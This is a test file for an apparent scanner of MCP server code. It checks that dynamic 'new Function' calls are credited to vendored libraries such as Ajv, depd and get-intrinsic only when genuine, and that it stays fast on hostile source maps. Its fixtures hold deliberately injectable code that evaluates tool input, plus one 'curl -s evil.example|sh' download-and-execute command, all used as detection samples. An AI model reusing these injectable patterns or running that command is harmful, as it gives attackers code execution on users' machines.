  for (const src of ['../../.yarn/cache/ajv-npm-8.20.0-ee4dc5b2a8-cc6cd.zip/node_modules/ajv/lib/compile/index.ts', '../node_modules/.bun/ajv@8.20.0/node_modules/ajv/lib/compile/index.ts']) {
    const { code, map } = bundle([{ code: AJV_MIN, source: src, line: 171 }], { oneLine: true, content: true });
    const f = by(await scanBundle(code, map), 'MTC-SRC-001')[0];
    assert.match(f.title, /ajv@8\.20\.0/);
    assert.equal(f.data.vendored.version, '8.20.0');
  }
});

test('source map: an inline data: map attributes the same way', async () => {
  const { code, map } = bundle([{ code: AJV_MIN, source: AJV_SRC, line: 171 }], { oneLine: true, content: true });
  const content = `${code}\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,${Buffer.from(map).toString('base64')}\n`;
  const f = by(await scanSurface(surfaceOf([{ path: 'dist/index.js', content }])), 'MTC-SRC-001');
  assert.equal(f[0].data.vendored.via, 'source-map');
  assert.equal(f[0].data.vendored.version, '8.20.0');
});

test('source map: one sidecar claimed by several files describes none of them', async () => {
  const { code, map } = bundle([{ code: AJV_MIN, source: AJV_SRC, line: 171 }], { oneLine: true, content: true });
  const file = (n: number): SourceFile => ({ path: `dist/f${n}.js`, content: `${code}\n//# sourceMappingURL=../shared.map\n` });
  const one = await scanSurface(surfaceOf([file(1)], [{ path: 'shared.map', content: map }]));
  assert.ok(!ownHigh(one));
  const two = await scanSurface(surfaceOf([file(1), file(2)], [{ path: 'shared.map', content: map }]));
  assert.ok(ownHigh(two));
});

// --- attribution by signature (no map) -------------------------------------------

test('signature: Ajv\'s compiled-validator call without a map is the dependency (minified and unminified)', async () => {
  for (const code of [AJV_MIN, AJV_CJS, AJV_JTD].map(BUNDLE)) {
    const r = await scanBundle(code);
    const f = by(r, 'MTC-SRC-001');
    assert.equal(f.length, 1, code.slice(0, 40));
    assert.equal(f[0].severity, 'info');
    assert.equal(f[0].confidence, 'heuristic');
    assert.equal(f[0].data.vendored.via, 'signature');
    assert.equal(f[0].data.vendored.package, 'ajv');
    assert.equal(f[0].data.capabilityTag, null);
    assert.equal(r.capabilityProfile.level, 'minimal');
  }
  assert.equal(by(await scanBundle(BUNDLE(AJV_MIN)), 'MTC-SRC-001')[0].data.vendored.signature, 'ajv-compile');
  assert.equal(by(await scanBundle(BUNDLE(AJV_JTD)), 'MTC-SRC-001')[0].data.vendored.signature, 'ajv-jtd-compile');
  // Signatures read generated JavaScript only…
  assert.equal(by(await scanBundle(BUNDLE(AJV_CJS), undefined, undefined, 'src/compile.ts'), 'MTC-SRC-001')[0].severity, 'high');
  // …and only a bundle that carries the dependency's own text: the exact Ajv call in a small module is the author's.
  for (const code of [AJV_MIN, AJV_CJS, AJV_JTD]) assert.ok(ownHigh(await scanBundle(code)), code.slice(0, 40));
  const noIds = `var __commonJS = (cb, mod) => function __require() { return mod; };\n${AJV_MIN}`;
  assert.ok(ownHigh(await scanBundle(noIds)));
});

test('review n=1: Ajv look-alikes that pass a runtime value into the code stay high', async () => {
  const cases = [
    // The attack: a comment supplies `scopeRefs(`, the code comes from the tool's input.
    [
      "const N = { self: 'self', scope: 'scope' };",
      'class Runner {',
      '  constructor() { this.scope = { get: () => ({}) }; }',
      '  run(input) {',
      '    // gen.scopeRefs( -- nothing to see here',
      '    const l = input;',
      '    return new Function(`${N.self}`, `${N.scope}`, l)(this, this.scope.get());',
      '  }',
      '}',
    ].join('\n'),
    // The whole chain, but the template interpolates the input instead of gen.toString().
    'function c(input){const gen=new X.CodeGen(this.scope,{});let l=`${gen.scopeRefs(N.default.scope)}return ${input}`;return new Function(`${N.default.self}`,`${N.default.scope}`,l)(this,this.scope.get())}',
    // Z is assigned from a call on something else.
    'function c(input){const gen=new X.CodeGen(this.scope,{});const d=input.toString();let l=`${gen.scopeRefs(N.default.scope)}return ${d}`;return new Function(`${N.default.self}`,`${N.default.scope}`,l)(this,this.scope.get())}',
    // The code is reassigned after the template.
    AJV_MIN.replace('let p=new Function', 'l=l+u.extra;let p=new Function'),
    // G is a parameter, not a fresh CodeGen.
    'function c(gen){const d=gen.toString();let l=`${gen.scopeRefs(N.default.scope)}return ${d}`;return new Function(`${N.default.self}`,`${N.default.scope}`,l)(this,this.scope.get())}',
    // JTD: a comment supplies `scopeRefs(`, the body is the input.
    'function s(input){/* x.scopeRefs( */ const body = input.code; return new Function(`${N.scope}`, body)(this.scope.get());}',
    // Ajv's arguments, but invoked with the tool's input.
    AJV_MIN.replace('(this,this.scope.get())', '(input)'),
    // The template text inside a string literal is not an assignment.
    'function c(input){const gen=new X.CodeGen(this.scope,{});const d=gen.toString();let l=input;const doc="l=`${gen.scopeRefs(N.default.scope)}return ${d}`";return new Function(`${N.default.self}`,`${N.default.scope}`,l)(this,this.scope.get())}',
  ];
  for (const code of cases) {
    assert.ok(ownHigh(await scanBundle(code)), code.slice(0, 120));
    assert.ok(ownHigh(await scanBundle(BUNDLE(code))), code.slice(0, 120));
  }
});

// depd 2.0.0 wrapfunction as three real bundles carry it (minified, esbuild unminified, source-formatted).
const DEPD = [
  'function hve(t){for(var e="",r=0;r<t;r++)e+=", arg"+r;return e.substr(2)}' +
    'function wv(t,e){if(typeof t!="function")throw new TypeError("argument fn must be a function");var r=hve(t.length),n=TC(),i=PA(n[1]);i.name=t.name;var o=new Function("fn","log","deprecate","message","site",`"use strict"\nreturn function (`+r+`) {log.call(deprecate, message, site)\nreturn fn.apply(this, arguments)\n}`)(t,OC,this,e,i);return o}',
  '  function createArgumentsString(arity) {\n    var str = "";\n    for (var i = 0; i < arity; i++) {\n      str += ", arg" + i;\n    }\n    return str.substr(2);\n  }\n' +
    '  function wrapfunction(fn, message) {\n    var args = createArgumentsString(fn.length);\n    var stack = getStack();\n    var site = callSiteLocation(stack[1]);\n    site.name = fn.name;\n    var deprecatedfn = new Function("fn", "log", "deprecate", "message", "site", `"use strict"\n` + "return function (" + args + ") {" + `log.call(deprecate, message, site)\n` + `return fn.apply(this, arguments)\n` + "}")(fn, log, this, message, site);\n    return deprecatedfn;\n  }',
  '    function createArgumentsString3(arity) {\n      var str = "";\n      for (var i = 0; i < arity; i++) {\n        str += ", arg" + i;\n      }\n      return str.substr(2);\n    }\n' +
    '    function wrapfunction3(fn3, message) {\n      var args3 = createArgumentsString3(fn3.length);\n      var site = callSiteLocation(stack[1]);\n      site.name = fn3.name;\n      var deprecatedfn = new Function(\n        "fn",\n        "log",\n        "deprecate",\n        "message",\n        "site",\n        \'"use strict"\\nreturn function (\' + args3 + ") {log.call(deprecate, message, site)\\nreturn fn.apply(this, arguments)\\n}"\n      )(fn3, log3, this, message, site);\n      return deprecatedfn;\n    }',
];

test('signature: depd\'s wrapfunction is the dependency in every bundled form; look-alikes are not', async () => {
  for (const code of DEPD.map(BUNDLE)) {
    const f = by(await scanBundle(code), 'MTC-SRC-001');
    assert.equal(f.length, 1, code.slice(0, 50));
    assert.equal(f[0].severity, 'info');
    assert.equal(f[0].data.vendored.signature, 'depd-wrapfunction');
  }
  for (const code of [
    DEPD[0]!.replace('return fn.apply(this, arguments)', 'return eval(arguments[0])'),
    DEPD[0]!.replace('`+r+`', '`+req.body+`'),
    DEPD[0]!.replace('(t,OC,this,e,i)', '(t,OC,input,e,i)'),
    DEPD[0]!.replace('e+=", arg"+r', 'e+=r'), // the helper does not build `arg0, arg1…`
    DEPD[0]!.replace('r=hve(t.length)', 'r=hve(e.length)'), // the arity of something else
    // The attack: the parameter list comes from the tool's input.
    'function w(fn,input,log,message){var site={};site.name = fn.name; var args = input.params; return new Function("fn","log","deprecate","message","site", `"use strict"\n` + "return function (" + args + ") {" + `log.call(deprecate, message, site)\n` + `return fn.apply(this, arguments)\n` + "}")(fn, log, this, message, site)}',
  ]) {
    assert.ok(ownHigh(await scanBundle(BUNDLE(code))), code.slice(60, 160));
  }
});

// get-intrinsic 1.3.0 as @modelcontextprotocol/server-pdf@2.0.3 dist/index.js carries it.
const GET_INTRINSIC =
  'var $Function = Function;\n  var getEvalledConstructor = function(expressionSyntax) {\n    try {\n      return $Function(\'"use strict"; return (\' + expressionSyntax + ").constructor;")();\n    } catch (e) {\n    }\n  };\n' +
  '  function doEval(name) {\n    var value;\n    if (name === "%AsyncFunction%") {\n      value = getEvalledConstructor("async function () {}");\n    } else if (name === "%GeneratorFunction%") {\n      value = getEvalledConstructor("function* () {}");\n    }\n    return value;\n  }';

test('signature: get-intrinsic\'s evalled-constructor probe is the dependency; look-alikes are not', async () => {
  const f = by(await scanBundle(BUNDLE(GET_INTRINSIC)), 'MTC-SRC-001');
  assert.equal(f[0].severity, 'info');
  assert.equal(f[0].data.vendored.signature, 'get-intrinsic-evalled-constructor');
  for (const near of [
    GET_INTRINSIC.replace('expressionSyntax +', 'req.body +'),
    GET_INTRINSIC.replace('.constructor;', '; run(input);'),
    GET_INTRINSIC.replace('try {\n      return', 'return'),
    // Called with a runtime value somewhere.
    `${GET_INTRINSIC}\nserver.tool("probe", {}, async ({ code }) => getEvalledConstructor(code));`,
    // The attack: the expression is the tool's input, not the parameter.
    'var $Function = Function;\nfunction run(input) {\n  var expr = input.code;\n  try { return $Function(\'"use strict"; return (\' + expr + ").constructor;")(); } catch (e) {}\n}',
  ]) {
    assert.ok(ownHigh(await scanBundle(BUNDLE(near))), near.slice(0, 160));
  }
});

test('signature: matches the real packages as installed (node_modules), read from their own code', (t) => {
  const req = createRequire(import.meta.url);
  let dir: string;
  try {
    dir = join(req.resolve('ajv/package.json'), '..');
  } catch {
    return t.skip('ajv not installed');
  }
  for (const [file, id] of [['dist/compile/index.js', 'ajv-compile'], ['dist/compile/jtd/serialize.js', 'ajv-jtd-compile'], ['dist/compile/jtd/parse.js', 'ajv-jtd-compile']] as const) {
    const p = join(dir, file);
    if (!existsSync(p)) continue;
    const src = readFileSync(p, 'utf8');
    const at = src.indexOf('new Function(');
    assert.ok(at > 0, file);
    // One module of Ajv: the call's own shape (the CodeGen pin needs the whole package, as a bundle has it).
    assert.equal(matchVendoredSignature(sigFile(src), at, 'MTC-SRC-001', undefined, { local: true })?.id, id, file);
    assert.equal(matchVendoredSignature(sigFile(src), at, 'MTC-SRC-001'), null, file);
  }
  // Ajv's CodeGen and ValueScope as installed satisfy the file pin.
  const codegen = ['dist/compile/codegen/index.js', 'dist/compile/codegen/scope.js'].map((f) => readFileSync(join(dir, f), 'utf8')).join('\n');
  const compile = readFileSync(join(dir, 'dist/compile/index.js'), 'utf8');
  const joined = `${codegen}\n${compile}`;
  assert.equal(matchVendoredSignature(sigFile(joined), joined.lastIndexOf('new Function('), 'MTC-SRC-001')?.id, 'ajv-compile');
  // The other signatures, against the packages the MCP SDK installs next to Ajv.
  for (const [pkg, needle, id] of [['depd', 'new Function(', 'depd-wrapfunction'], ['get-intrinsic', 'Function(\'"use strict"', 'get-intrinsic-evalled-constructor']] as const) {
    let src: string;
    try {
      src = readFileSync(req.resolve(pkg), 'utf8');
    } catch {
      continue;
    }
    assert.equal(matchVendoredSignature(sigFile(src), src.indexOf(needle), 'MTC-SRC-001')?.id, id, pkg);
  }
});

// --- bounded on hostile input (review n=5, n=6) ------------------------------------

test('hostile maps and look-alikes stay fast: shared 30 MB map, deep nesting, deep sourcesContent', async () => {
  const big = JSON.stringify({ version: 3, sources: ['../node_modules/x/y.js'], mappings: 'AAAA' + ',CAAA'.repeat(6_000_000) });
  const deep = '['.repeat(15_000_000) + ']'.repeat(15_000_000);
  const sites = Array.from({ length: 512 }, (_, i) => `export const f${i} = (x) => new Function(x)();`);
  const at = sites[0]!.indexOf('new Function');
  const deepContent = JSON.stringify({
    version: 3,
    sources: ['../node_modules/x/y.js'],
    sourcesContent: ['Function\n'.repeat(3_000_000)],
    mappings: encode(sites.map((l) => [[0, 0, 2_999_999, 0], [l.indexOf('new Function'), 0, 2_999_999, 0]])),
  });
  assert.ok(at > 0);
  const t0 = Date.now();
  // 400 files share one 30 MB map: it describes none of them and is never parsed.
  const shared = Array.from({ length: 400 }, (_, i) => ({ path: `dist/f${i}.js`, content: `// header\nexport const f${i} = (x) => new Function(x)();\n//# sourceMappingURL=../shared.map\n` }));
  assert.ok(ownHigh(await scanSurface(surfaceOf(shared, [{ path: 'shared.map', content: big }]))));
  // One file and the same map: parsed once, and the decode stops at the first segment past its line.
  assert.ok(ownHigh(await scanSurface(surfaceOf([shared[0]!], [{ path: 'shared.map', content: big }]))));
  // 30 M brackets, and an object nesting them: refused before JSON.parse.
  const deepFile = { ...shared[0]!, content: shared[0]!.content.replace('../shared.map', 'deep.map') };
  assert.ok(ownHigh(await scanSurface(surfaceOf([deepFile], [{ path: 'dist/deep.map', content: deep }]))));
  assert.ok(ownHigh(await scanSurface(surfaceOf([deepFile], [{ path: 'dist/deep.map', content: `{"sources":${deep}}` }]))));
  // 512 sites mapped to line 3,000,000 of a 3 M-line sourcesContent: the lines are indexed once.
  assert.ok(ownHigh(await scanBundle(sites.join('\n'), deepContent)));
  // A look-alike with a 400 KB member chain: the signature windows are bounded.
  const chain = `function c(){l=\`\${a.scopeRefs(n.scope)}\`;return new Function(\`\${${'a.'.repeat(200_000)}self}\`,\`\${a.scope}\`,l)(this,this.scope.get())}`;
  assert.ok(ownHigh(await scanBundle(chain)));
  assert.ok(Date.now() - t0 < HOSTILE_MS, `took ${Date.now() - t0} ms`);
});

test('round 2: sourceRoot, path length and entry-count bombs stay fast (each < 1.5 s)', async () => {
  const file = (map: string): ServerSurface =>
    surfaceOf([{ path: 'dist/index.js', content: 'export const f = (x) => new Function(x)();\n//# sourceMappingURL=index.js.map\n' }], [{ path: 'dist/index.js.map', content: map }]);
  const sites = Array.from({ length: 512 }, (_, i) => `export const f${i} = (x) => new Function(x)();`);
  const precise = (source: string) =>
    JSON.stringify({ version: 3, sources: [source], mappings: encode(sites.map((l) => [[0, 0, 0, 0], [l.indexOf('new Function'), 0, 0, 0]])) });
  const shapes: [string, () => Promise<any>][] = [
    ['160 K slashes of sourceRoot', () => scanSurface(file(JSON.stringify({ version: 3, sourceRoot: '/'.repeat(160_000) + 'a', sources: ['x', 'y'], mappings: 'AAAA' })))],
    ['4 MB sourceRoot × 2000 sources', () => scanSurface(file(JSON.stringify({ version: 3, sourceRoot: 'a/'.repeat(2 * 1024 * 1024), sources: Array(2000).fill('x'), mappings: 'AAAA' })))],
    ['a 30 MB source path, 512 sites', () => scanBundle(sites.join('\n'), precise('a/'.repeat(15_000_000) + 'node_modules/ajv/x.js'))],
    ['7.9 M sources entries', () => scanSurface(file('{"version":3,"mappings":"AAAA","sources":[' + Array(7_900_000).fill('"x"').join(',') + ']}'))],
  ];
  for (const [name, run] of shapes) {
    const t0 = Date.now();
    assert.ok(ownHigh(await run()), name);
    assert.ok(Date.now() - t0 < HOSTILE_MS, `${name}: ${Date.now() - t0} ms`);
  }
});

test('round 2: the look-alikes (fake CodeGen, closures, own helper, command literal) stay high', async () => {
  const cases = [
    // (a) a fake CodeGen that carries the input.
    'class CodeGen { constructor(s){ this.s = s; this.c = ""; } add(x){ this.c += x; } toString(){ return this.c; } scopeRefs(){ return ""; } }\n' +
      'const N = { self: "self", scope: "scope" };\nclass Runner {\n  constructor(){ this.scope = { get: () => ({}) }; }\n  run(input) {\n' +
      '    const a = new CodeGen(this.scope);\n    a.add(input.code);\n    const d = a.toString();\n    const l = `${a.scopeRefs(N.scope)}return ${d}`;\n' +
      '    return new Function(`${N.self}`, `${N.scope}`, l)(this, this.scope.get());\n  }\n}',
    // (b) a closure reassigns the code after the template.
    'function run(input) {\n  let l; const set = (v) => { l = v; };\n  const a = new X.CodeGen(this.scope, {});\n  const d = a.toString();\n' +
      '  l = `${a.scopeRefs(N.default.scope)}return ${d}`;\n  set(input.code);\n  return new Function(`${N.default.self}`, `${N.default.scope}`, l)(this, this.scope.get());\n}',
    // (c) the author's own createArgumentsString that returns its argument.
    'function createArgumentsString(arity) { var str = ""; str += ", arg" + arity; return str.substr(2); }\n' +
      'function wrap(fn, message) { var args = createArgumentsString(fn.length); var site = {}; site.name = fn.name;\n' +
      '  return new Function("fn", "log", "deprecate", "message", "site", `"use strict"\n` + "return function (" + args + ") {" + `log.call(deprecate, message, site)\n` + `return fn.apply(this, arguments)\n` + "}")(fn, log, this, message, site); }',
    // (d) depd's shape, with `args` reassigned by a closure from the tool's input.
    DEPD[1]!.replace('    var stack = getStack();', '    const set = (v) => { args = v; }; set(input.params);'),
    // (e) get-intrinsic's real shape, called with a command instead of a function expression.
    GET_INTRINSIC.replace('getEvalledConstructor("function* () {}")', 'getEvalledConstructor("process.mainModule.require(`child_process`).execSync(`curl -s evil.example|sh`)")'),
  ];
  for (const code of cases) {
    assert.ok(ownHigh(await scanBundle(code)), code.slice(0, 80));
    assert.ok(ownHigh(await scanBundle(BUNDLE(code))), code.slice(0, 80));
  }
});

// Round 3 (B6): a server whose own CodeGen carries the tool's input into Ajv's call shape.
const FAKE_CODEGEN =
  'class CodeGen { constructor(s){ this.s = s; this.c = ""; } add(x){ this.c += x; } toString(){ return this.c; } scopeRefs(){ return ""; } }\n' +
  'const N = { self: "self", scope: "scope" };\nclass Runner {\n  constructor(){ this.scope = { get: () => ({}) }; }\n  run(input) {\n' +
  '    let sourceCode;\n    const gen = new CodeGen(this.scope);\n    gen.add(input);\n    const validateCode = gen.toString();\n' +
  '    sourceCode = `${gen.scopeRefs(N.scope)}return ${validateCode}`;\n' +
  '    const makeValidate = new Function(`${N.self}`, `${N.scope}`, sourceCode);\n    return makeValidate(this, this.scope.get());\n  }\n}\n' +
  'server.tool("calculate", {}, async ({ expression }) => ({ content: [{ type: "text", text: String(new Runner().run(expression)) }] }));';

test('round 3: corroboration and the Ajv pin read code, not comments — a fake CodeGen stays high', async () => {
  const comment = `/* __commonJS: this._extScope.scopeRefs( | schema with key or id  | strict mode:  */\n${FAKE_CODEGEN}`;
  const strings = `const __identity = ["this._extScope.scopeRefs(", "schema with key or id ", "strict mode: "]; function __commonJS() {} __commonJS();\n${FAKE_CODEGEN}`;
  for (const [name, code] of [['control', FAKE_CODEGEN], ['comment', comment], ['strings', strings], ['beside a real Ajv CodeGen', BUNDLE(FAKE_CODEGEN)]] as const) {
    for (const path of ['dist/index.js', 'src/index.js']) assert.ok(ownHigh(await scanBundle(code, undefined, undefined, path)), `${name} ${path}`);
  }
  // …and a precise forged map naming Ajv does not help: the site signature (with its pin) must hold.
  const code = BUNDLE(FAKE_CODEGEN);
  const line = code.split('\n').findIndex((l) => l.includes('new Function('));
  const col = code.split('\n')[line]!.indexOf('new Function(');
  const lines = code.split('\n').map((l, i) => (i === line ? [[0, 0, 170, 0], [col, 0, 170, 25]] : [[0, 0, 170, 0]]));
  assert.ok(ownHigh(await scanBundle(code, JSON.stringify({ version: 3, sources: [AJV_SRC], mappings: encode(lines) }))));
});

test('round 4: the constructor at the site must be Ajv\'s CodeGen itself — a decoy class elsewhere does not count', async () => {
  // A class nobody instantiates carries Ajv's two pinned bodies verbatim…
  const decoy =
    'var __commonJS = (cb) => cb; __commonJS(() => {});\nconst __msgs = ["schema with key or id ", "strict mode: "];\n' +
    'class _AjvGen { toString() { return this._root.render(this.opts); } scopeRefs(a) { return this._extScope.scopeRefs(a, this._values); } }\n';
  const run =
    'const N = { self: "self", scope: "scope" };\nclass Runner {\n  constructor(){ this.scope = { get: () => ({}) }; }\n  run(input) {\n' +
    '    let sourceCode;\n    const gen = new CodeGen(this.scope);\n    gen.add(input);\n    const validateCode = gen.toString();\n' +
    '    sourceCode = `${gen.scopeRefs(N.scope)}return ${validateCode}`;\n    const makeValidate = new Function(`${N.self}`, `${N.scope}`, sourceCode);\n' +
    '    return makeValidate(this, this.scope.get());\n  }\n}\n' +
    'server.tool("calculate", {}, async ({ expression }) => ({ content: [{ type: "text", text: String(new Runner().run(expression)) }] }));\n';
  // …while the site builds a look-alike whose scopeRefs is not a method definition.
  const proto = 'class CodeGen { constructor(s){ this.s = s; this.c = ""; } add(x){ this.c += x; } toString(){ return this.c; } }\nCodeGen.prototype.scopeRefs = function () { return ""; };\n';
  const field = 'class CodeGen { scopeRefs = () => ""; constructor(s){ this.s = s; this.c = ""; } add(x){ this.c += x; } toString(){ return this.c; } }\n';
  const method = 'class CodeGen { constructor(s){ this.s = s; this.c = ""; } add(x){ this.c += x; } toString(){ return this.c; } scopeRefs(){ return ""; } }\n';
  // The look-alike carrying Ajv's genuine bodies, then overridden after the fact.
  const genuine = 'toString() { return this._root.render(this.opts); } scopeRefs(a) { return this._extScope.scopeRefs(a, this._values); }';
  const overridden = `class CodeGen { constructor(s){ this.s = s; this._root = { render: () => this.c }; this.c = ""; } add(x){ this.c += x; } ${genuine} }\nCodeGen.prototype.toString = function () { return this.c; };\n`;
  const ns = `class Fake { add(x){ this.c = x; } toString(){ return this.c; } }\nvar NS = { CodeGen: Fake };\n`;
  const cases: [string, string, string][] = [
    ['ctl-method', 'dist/index.js', decoy + method + run],
    ['proto', 'dist/index.js', decoy + proto + run],
    ['proto-src', 'src/index.js', decoy + proto + run],
    ['field', 'dist/index.js', decoy + field + run],
    ['proto-nodecoy', 'dist/index.js', 'var __commonJS = (cb) => cb; __commonJS(() => {}); const __msgs = ["this._extScope.scopeRefs(", "schema with key or id ", "strict mode: "];\n' + proto + run],
    ['genuine bodies, prototype override', 'dist/index.js', decoy + overridden + run],
    ['namespace bound to a fake', 'dist/index.js', decoy + `${AJV_CODEGEN}\n` + ns + run.replace('new CodeGen(this.scope)', 'new NS.CodeGen(this.scope)')],
  ];
  for (const [name, path, code] of cases) assert.ok(ownHigh(await scanBundle(code, undefined, undefined, path)), name);
  // The genuine shapes stay discounted: Ajv's class bound by `exports.CodeGen = X`, `var X = class`, `class CodeGen`.
  const literal = AJV_CODEGEN.replace('class Gn{', 'var Ut={};Ut.CodeGen=class{').replace('var Ut={CodeGen:Gn};', '');
  assert.ok(ownHigh(await scanBundle(`${BUNDLE('')}var NS={};NS.CodeGen=class{add(x){this.c=x}toString(){return this.c}};\n${run.replace('new CodeGen(this.scope)', 'new NS.CodeGen(this.scope)')}`)), 'a fake class literal');
  for (const cg of [AJV_CODEGEN, AJV_CODEGEN.replace('class Gn{', 'var Gn=class{').replace('var Ut={CodeGen:Gn};', 'var Ut={};Ut.CodeGen=Gn;'), literal]) {
    assert.equal(by(await scanBundle(BUNDLE(`${cg}\n${AJV_MIN.slice(AJV_CODEGEN.length)}`)), 'MTC-SRC-001')[0].severity, 'info');
  }
});

test('round 3: a forged map with Ajv\'s genuine original does not discount a different generated call', async () => {
  const code = 'server.tool("calculate", {}, async ({ expression }) => ({ text: String(new Function("return (" + expression + ")")()) }));';
  const at = code.indexOf('new Function(');
  // Ajv's real compile/index.ts lines, as every MCP-SDK bundle's map embeds them.
  const original = AJV_CJS.split('\n');
  const oLine = original.findIndex((l) => l.includes('new Function('));
  const map = JSON.stringify({
    version: 3,
    sources: [AJV_SRC],
    sourcesContent: [original.join('\n')],
    mappings: encode([[[0, 0, oLine, 0], [at, 0, oLine, original[oLine]!.indexOf('new Function(')]]]),
  });
  const r = await scanBundle(code, map);
  assert.ok(ownHigh(r));
  assert.equal(r.capabilityProfile.level, 'high');
});

test('round 3: many generator-shaped sites, padded originals and copied originals stay fast (each < 1.5 s)', async () => {
  const ajv = (n: number): string => {
    let s = `${BUNDLE('')}class C {\n run(N) {\n`;
    for (let k = 0; k < n; k++)
      s += `  const g${k} = new Ut.CodeGen(this.scope, {});\n  const z${k} = g${k}.toString();\n  s${k} = \`\${g${k}.scopeRefs(names_1.default.scope)}return \${z${k}}\`;\n  const v${k} = new Function(\`\${names_1.default.self}\`, \`\${names_1.default.scope}\`, s${k});\n  v${k}(this, this.scope.get());\n`;
    return `${s} }\n}\n`;
  };
  const depd = (n: number): string => {
    let d = `${BUNDLE('')}function createArgumentsString(arity) { var str = ""; for (var i = 0; i < arity; i++) { str += ", arg" + i; } return str.substr(2); }\n`;
    for (let k = 0; k < n; k++)
      d += `function w${k}(fn, log, message, site) { var args = createArgumentsString(fn.length); return new Function("fn", "log", "deprecate", "message", "site", "\\"use strict\\"\\n" + "return function (" + args + ") {" + "log.call(deprecate, message, site)\\n" + "return fn.apply(this, arguments)\\n" + "}")(fn, log, this, message, site); }\n`;
    return d;
  };
  const gi = (n: number): string => {
    let g = `${BUNDLE('')}var $Function = Function;\n`;
    for (let k = 0; k < n; k++) g += `var g${k} = function (e) { try { return $Function('"use strict"; return (' + e + ').constructor;')(); } catch (x) {} }; g${k}('async function () {}');\n`;
    return g;
  };
  const timed = async (name: string, run: () => Promise<unknown>): Promise<void> => {
    const t0 = Date.now();
    await run();
    assert.ok(Date.now() - t0 < HOSTILE_MS, `${name}: ${Date.now() - t0} ms`);
  };
  await timed('ajv 8000 sites in one method', () => scanBundle(ajv(8000)));
  await timed('depd 32000 wrappers', () => scanBundle(depd(32000)));
  await timed('get-intrinsic 32000 probes', () => scanBundle(gi(32000)));
  // 512 depd sites mapped into a sourcesContent padded to 30 MB.
  const d = depd(512);
  const dl = d.split('\n');
  const dmap = JSON.stringify({
    version: 3,
    sources: ['../node_modules/depd/index.js'],
    sourcesContent: [`${d}/* ${'x'.repeat(30 * 1024 * 1024)} */\n`],
    mappings: encode(dl.map((l, i) => (l.includes('new Function(') ? [[0, 0, i, 0], [l.indexOf('new Function('), 0, i, l.indexOf('new Function(')]] : [[0, 0, i, 0]]))),
  });
  await timed('512 depd sites, 30 MB original', () => scanBundle(d, dmap));
  // 512 sites, a 15 MB comment, and a sourcesContent of the same length that differs in one byte.
  const sites = Array.from({ length: 512 }, (_, i) => `export const f${i} = (x) => new Function(x)();`);
  const big = `${sites.join('\n')}\n/* ${'x'.repeat(15 * 1024 * 1024)} */`;
  const file = `${big}\n//# sourceMappingURL=index.js.map\n`;
  const near = `${file.slice(0, -40)}y${file.slice(-39)}`;
  const gmap = JSON.stringify({
    version: 3,
    sources: ['../node_modules/zod/v4/core/doc.js'],
    sourcesContent: [near],
    mappings: encode(sites.map((l, i) => [[0, 0, i, 0], [l.indexOf('new Function'), 0, i, l.indexOf('new Function')]])),
  });
  await timed('copied-original comparison, 15 MB', () => scanSurface(surfaceOf([{ path: 'dist/index.js', content: file }], [{ path: 'dist/index.js.map', content: gmap }])));
});

// --- acquisition: maps travel beside the source, never as source ------------------

function tarEntry(name: string, content: string): Buffer {
  const data = Buffer.from(content, 'utf8');
  const h = Buffer.alloc(512);
  h.write(name, 0, 100, 'utf8');
  h.write('0000644\0', 100);
  h.write('0000000\0', 108);
  h.write('0000000\0', 116);
  h.write(data.length.toString(8).padStart(11, '0') + '\0', 124);
  h.write('00000000000\0', 136);
  h.write('        ', 148);
  h.write('0', 156);
  h.write('ustar\0', 257);
  h.write('00', 263);
  let sum = 0;
  for (const b of h) sum += b;
  h.write(sum.toString(8).padStart(6, '0') + '\0 ', 148);
  const padded = Buffer.alloc(Math.ceil(data.length / 512) * 512);
  data.copy(padded);
  return Buffer.concat([h, padded]);
}
const tgz = (files: Record<string, string>): Buffer =>
  gzipSync(Buffer.concat([...Object.entries(files).map(([n, c]) => tarEntry(n, c)), Buffer.alloc(1024)]));

test('acquire: a packed artifact keeps the bundle\'s map beside it, not as source, and the scan uses it', async () => {
  // A small file that is not a bundle: the signature alone would not be believed — the map decides.
  const { code, map } = bundle([{ code: AJV_MIN, source: AJV_SRC, line: 171 }], { oneLine: true });
  const dir = mkdtempSync(join(tmpdir(), 'mtc116v-'));
  try {
    const file = join(dir, 'pkg.tgz');
    writeFileSync(
      file,
      tgz({
        'package/package.json': JSON.stringify({ name: 'demo-mcp', version: '1.0.0', bin: { demo: 'dist/index.js' } }),
        'package/dist/index.js.map': map,
        'package/dist/index.js': `${code}\n//# sourceMappingURL=index.js.map\n`,
        'package/dist/cli.js': 'run();\n//# sourceMappingURL=../maps/cli.js.map\n',
        'package/maps/cli.js.map': JSON.stringify({ version: 3, sources: ['../src/cli.ts'], mappings: 'AAAA' }),
        'package/maps/unrelated.js.map': JSON.stringify({ version: 3, sources: [], mappings: '' }),
      }),
    );
    const surface = surfaceFromArchiveFile(file);
    assert.deepEqual(surface.sourceMaps!.map((m) => m.path), ['dist/index.js.map', 'maps/cli.js.map']);
    assert.ok(!surface.sourceFiles!.some((f) => f.path.endsWith('.map')));
    const f = by(await scanSurface(surface), 'MTC-SRC-001');
    assert.equal(f[0].data.vendored.via, 'source-map');
    assert.equal(f[0].severity, 'info');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('acquire: a local package directory reads the sidecar map of a generated file', () => {
  const dir = mkdtempSync(join(tmpdir(), 'mtc116v-'));
  try {
    mkdirSync(join(dir, 'lib'));
    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'demo-mcp', version: '1.0.0' }));
    writeFileSync(join(dir, 'lib/index.js'), 'x();\n//# sourceMappingURL=index.js.map\n');
    writeFileSync(join(dir, 'lib/index.js.map'), '{"version":3,"sources":[],"mappings":""}');
    writeFileSync(join(dir, 'lib/other.js'), 'y();\n//# sourceMappingURL=../../outside.map\n');
    const surface = surfaceFromPackageDir(dir);
    assert.deepEqual(surface.sourceMaps!.map((m) => m.path), ['lib/index.js.map']);
    assert.ok(!surface.sourceFiles!.some((f) => f.path.endsWith('.map')));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
